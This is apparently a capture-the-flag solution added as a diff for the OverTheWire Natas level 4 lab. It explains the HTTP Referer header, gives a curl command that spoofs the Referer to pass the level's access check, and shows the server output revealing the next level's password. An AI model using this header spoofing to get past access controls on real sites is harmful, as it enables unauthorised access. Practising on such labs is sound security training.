@@ -1,0 +1,16 @@
+# An HTTP request typically includes the method (GET, POST, etc.), URL, and protocol version.
+# It may also contain headers, such as "Authorization" (credentials) and "Referer" (originating URL), which provide additional information.
+# https://developer.mozilla.org/en-US/docs/Web/HTTP
+
+# The HTTP Referer header tells the server the URL of the page that linked to or requested the current resource.
+# It identifies where a user came from or where a resource is being used.
+# https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Referer
+
+curl -u natas4:QryZXc2e0zahULdHrtHxzyYkj59kUxLQ -e http://natas5.natas.labs.overthewire.org/ http://natas4.natas.labs.overthewire.org/index.php
+
+<div id="content">
+
+Access granted. The password for natas5 is 0n35PkggAPm2zbEpOU802c0x0Msn1ToK
+<br/>
+<div id="viewsource"><a href="index.php">Refresh page</a></div>
+</div>
